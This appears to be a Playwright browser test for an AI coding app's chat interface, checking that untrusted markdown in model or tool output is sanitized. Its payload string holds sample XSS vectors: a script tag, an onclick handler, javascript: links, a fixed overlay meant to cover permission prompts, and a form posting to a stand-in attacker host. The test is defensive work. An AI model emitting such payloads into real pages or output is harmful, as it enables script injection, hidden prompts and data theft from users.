import { expect, test, type Page } from "@playwright/test"
import { mockAigcfrogeServer } from "../utils/mock-server"
import { expectSessionTitle } from "../utils/waits"

// S1 B1/B3: Sanitization evidence for untrusted markdown (model and tool
// output) must run in a real browser. Unit tests use happy-dom, whose live
// NodeIterator becomes invalid when its current node is removed; attributes on
// later nodes can then skip sanitization. Only real Chromium geometry can prove
// that an overlay cannot cover a prompt and that KaTeX still renders.
// The two defenses are OUT_OF_FLOW_POSITIONS in markdown-cache.tsx at the
// attribute layer and `contain: layout` in markdown.css at the structural layer.
const directory = "C:/Aigcfroge/MarkdownSanitize"
const sessionID = "ses_md_sanitize"
const title = "Markdown sanitize"

const model = { providerID: "aigcfroge", modelID: "claude-opus-4-6", variant: "max" }

const session = {
  id: sessionID,
  slug: "markdown-sanitize",
  projectID: "proj_md_sanitize",
  directory,
  mode: "work",
  title,
  version: "dev",
  time: { created: 1700000000000, updated: 1700000000000 },
}

const base64Encode = (value: string) =>
  Buffer.from(value, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")

const provider = {
  all: [
    {
      id: "aigcfroge",
      label: "AigcForge",
      models: [
        { id: "claude-opus-4-6", label: "Claude Opus 4.6", mode: "chat", variants: [{ id: "max", label: "Max" }] },
      ],
    },
  ],
  default: "aigcfroge",
}

const project = {
  id: "proj_md_sanitize",
  worktree: directory,
  vcs: "git",
  name: "MarkdownSanitize",
  time: { created: 1700000000000, updated: 1700000000000 },
  sandboxes: [],
}

// One message combines every payload class: an unrelated prefix, script,
// handler, javascript: URL, dangerous style, overlay, formula, image, and form.
// The removable custom element intentionally precedes dangerous nodes. That
// ordering exposes happy-dom's iterator defect, while Chromium must continue
// sanitizing every later node; assertions against the final DOM are therefore
// the behavior evidence.
const payload = `# SANITIZEHEADING

<unknowntag data-prefix="1"></unknowntag>

PREFIXPROBE before the payload.

<script>window.__xss = 1</script>

<p id="handler-probe" onclick="alert(1)">HANDLERPROBE</p>

<a href="javascript:alert(1)">JSPROBE</a>

<p id="danger-style-probe" style="position:fixed;inset:0;z-index:99999;background:url('javascript:alert(1)')">DANGERSTYLEPROBE</p>

<p id="overlay-probe" style="position:fixed;inset:0;z-index:99999">OVERLAYPROBE</p>

公式 $\\frac{a}{b}$ 行内。

![probe](https://example.com/probe.png)

<form action="https://evil.example/steal"><input type="text" name="q"></form>FORMPROBE
`

const message = {
  info: {
    id: "msg_md_1",
    sessionID,
    role: "assistant",
    time: { created: 1700000001000 },
    summary: { diffs: [] },
    parentID: "msg_user_0",
    agent: "work-orchestrator",
    mode: "work",
    model,
    providerID: "aigcfroge",
    path: { cwd: directory, root: directory },
    cost: 0,
    tokens: { input: 0, output: 0, reasoning: 0, cache: { read: 0, write: 0 } },
  },
  parts: [{ id: "prt_md_1", sessionID, messageID: "msg_md_1", type: "text", text: payload }],
}

async function open(page: Page) {
  // Geometry contract: the overlay/KaTeX/form assertions measure real box
  // geometry against the viewport and need the message timeline of the
  // desktop layout. At 390px the session page renders its mobile tabs branch
  // (the changes tab instead of the timeline) — a separate mobile-layout
  // contract covered by mode-slot-fallback-a11y.spec.ts. Pin a desktop
  // viewport here so every matrix project observes the same contract.
  await page.setViewportSize({ width: 1280, height: 720 })
  await page.addInitScript(() => {
    localStorage.setItem("aigcfroge.global.dat:mode-view", JSON.stringify({ currentMode: "work" }))
  })
  await mockAigcfrogeServer(page, {
    directory,
    project,
    provider,
    sessions: [session],
    pageMessages: () => ({ items: [message] }),
    events: () => [],
    eventRetry: 16,
  })
  await page.goto(`/${base64Encode(directory)}/session/${sessionID}`)
  await expectSessionTitle(page, title)
  await expect(page.getByRole("heading", { name: "SANITIZEHEADING" }).first()).toBeVisible({ timeout: 60_000 })
}

test("sanitizes untrusted markdown while preserving safe rendering", async ({ page }) => {
  await open(page)

  await test.step("an injected position:fixed overlay cannot escape the markdown container", async () => {
    const probe = page.getByText("OVERLAYPROBE")
    await expect(probe).toBeVisible()

    const geometry = await probe.evaluate((node: HTMLElement) => {
      const container = node.closest('[data-component="markdown"]')
      if (!container) throw new Error("payload rendered outside the markdown container")
      const box = node.getBoundingClientRect()
      const bounds = container.getBoundingClientRect()
      const rect = (r: DOMRect) => ({ top: r.top, left: r.left, width: r.width, height: r.height })
      return {
        inlinePosition: node.style.position,
        computedPosition: getComputedStyle(node).position,
        containerContain: getComputedStyle(container).contain,
        box: rect(box),
        bounds: rect(bounds),
        viewport: { width: window.innerWidth, height: window.innerHeight },
      }
    })

    // Attribute defense: removing position also neutralizes inset and z-index.
    expect(geometry.inlinePosition).toBe("")
    expect(geometry.computedPosition).toBe("static")
    // Structural defense: layout containment keeps future positioned content in this box.
    expect(geometry.containerContain).toContain("layout")
    // Real geometry: the element does not fill the viewport.
    expect(geometry.box.height).toBeLessThan(geometry.viewport.height / 2)
    expect(geometry.box.width).toBeLessThanOrEqual(geometry.bounds.width + 1)
    expect(geometry.box.top).toBeGreaterThanOrEqual(geometry.bounds.top - 1)
  })

  await test.step("dangerous nodes and attributes stay stripped after an unrelated node", async () => {
    const container = page.locator('[data-component="markdown"]').first()

    // The unrelated prefix is removed without letting later attributes escape sanitization.
    await expect(page.getByText("PREFIXPROBE before the payload.")).toBeVisible()
    await expect(container.locator("unknowntag")).toHaveCount(0)
    await expect(container.locator("script")).toHaveCount(0)

    // Event-handler attributes are stripped while their text remains.
    await expect(page.getByText("HANDLERPROBE")).toBeVisible()
    await expect(container.locator("[onclick]")).toHaveCount(0)

    // DOMPurify removes href rather than preserving a javascript: prefix.
    await expect(page.getByText("JSPROBE")).toBeVisible()
    const hrefs = await container
      .locator("a[href]")
      .evaluateAll((anchors) => anchors.map((a) => a.getAttribute("href") ?? ""))
    expect(hrefs.some((href) => href.includes("javascript:"))).toBe(false)

    // The relevant style defense is flow containment: once position is removed,
    // the element cannot cover permission or question prompts. A preserved
    // background url with a javascript scheme is inert CSS, not an executable
    // vector, so this test does not require DOMPurify to remove it.
    const danger = await page.getByText("DANGERSTYLEPROBE").evaluate((node: HTMLElement) => ({
      position: getComputedStyle(node).position,
    }))
    expect(danger.position).toBe("static")
  })

  await test.step("KaTeX keeps the inline styles its visual layer needs", async () => {
    const katex = page.locator(".katex").first()
    await expect(katex).toBeVisible()
    const math = await katex.evaluate((node) => {
      const styled = Array.from(node.querySelectorAll<HTMLElement>("[style]"))
      const box = node.getBoundingClientRect()
      return {
        styledCount: styled.length,
        properties: [...new Set(styled.flatMap((el) => Array.from(el.style)))].sort(),
        height: box.height,
      }
    })

    // KaTeX needs inline height/top/vertical-align to position its visual layers.
    expect(math.styledCount).toBeGreaterThan(0)
    expect(math.properties).toContain("height")
    expect(math.height).toBeGreaterThan(0)
  })

  await test.step("images render while form controls stay stripped", async () => {
    await expect(page.locator('[data-component="markdown"] img[alt="probe"]')).toHaveCount(1)
    await expect(page.getByText("FORMPROBE")).toBeVisible()
    await expect(page.locator('[data-component="markdown"] form')).toHaveCount(0)
    await expect(page.locator('[data-component="markdown"] input')).toHaveCount(0)
  })
})
